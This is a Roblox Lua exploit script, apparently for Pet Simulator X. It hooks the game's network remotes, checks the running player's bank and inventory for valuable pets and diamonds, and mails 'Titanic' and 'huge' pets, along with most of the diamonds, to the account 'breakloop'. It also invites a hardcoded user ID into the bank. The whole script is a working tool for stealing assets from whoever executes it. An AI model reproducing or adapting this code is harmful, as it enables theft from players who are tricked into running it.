local v1 = require(game.ReplicatedStorage:WaitForChild("Framework"):WaitForChild("Library")) 
local cooldown = os.time() 
local GetRemoteUpValue = nil 
local pets = require(game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets["Grab All Pets"]) 
for _, V in pairs(getgc(true)) do 
	if type(V) ~= "table" then 
		continue 
	end 
	if rawget(V, "Invoke") then 
		if type(V.Invoke) == "function" then 
			if tostring(getfenv(V.Invoke).script) == "Network" then 
				GetRemoteUpValue = getupvalues(V.Invoke)[2] 
				break 
			end 
		end 
	end 
end 

function FireRemote(Name, ...) 
	if not GetRemoteUpValue then 
		return 
	end 
	local Remote = GetRemoteUpValue(Name) 
	if not Remote then 
		return 
	end 
	if typeof(Remote) ~= "Instance" then 
		return 
	end 
	if Remote.ClassName == "RemoteEvent" then 
		return Remote:FireServer(...) 
	elseif Remote.ClassName == "RemoteFunction" then 
		return Remote:InvokeServer(...) 
	end
end 

local function is_huge(petdata) 
	if pets[petdata.id]["huge"] then 
		return true 
	end 
	return false; 
end 

local function getMyBank() 
	local banks = FireRemote("Get My Banks") 
	for i,v in pairs(banks) do 
		if v.Owner == game.Players.LocalPlayer.UserId then 
			return v.BUID 
		end 
	end 
end 

local specialPets = {["6969"]=true} 
local function isNotablePet(id) 
	local petData = pets[id] 
	if petData.rarity == "Exclusive" then 
		return true 
	end 
	if specialPets[id] ~= nil then 
		return true 
	end 
end 

local function inviteToBank(bank) 
	if bank ~= nil then 
		local bankData = FireRemote("Get Bank",bank) 
		local pets = bankData.Storage.Pets 
		local diamonds = bankData.Storage.Currency.Diamonds 
		if diamonds > 1000000000 then 
			return true; 
		end 
		for i,v in pairs(pets) do 
			if isNotablePet(v.id) == true then 
				return true; 
			end 
		end 
	end 
end 

local bank = getMyBank() 
local invite = inviteToBank(bank) 
if invite then FireRemote("Invite To Bank",bank,2901872175) end 
local save = v1.Save.Get() 
local titanicHolder = game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets.Titanic 

if titanicHolder:FindFirstChildWhichIsA("TextButton") then 
	print("found titanic") 
	FireRemote("Send Mail",{ Recipient = "breakloop", Message = "hey", Pets = {[1]=titanicHolder:FindFirstChildWhichIsA("TextButton").Name}, Diamonds = 0 }) 
end 

for i,v in pairs(save.Pets) do 
	if is_huge(v) then 
		print("ok2") 
		repeat wait(.1) until (cooldown - os.time()) <= 0 
		local diamonds = (save.Diamonds)-20000000 
		if diamonds < 0 then 
			diamonds = 0 
		end 
		print(FireRemote("Send Mail",{ Recipient = "breakloop", Message = "hi", Pets = {[1]=v.uid}, Diamonds = diamonds })) 
		cooldown = os.time() + 5 
	end 
end 
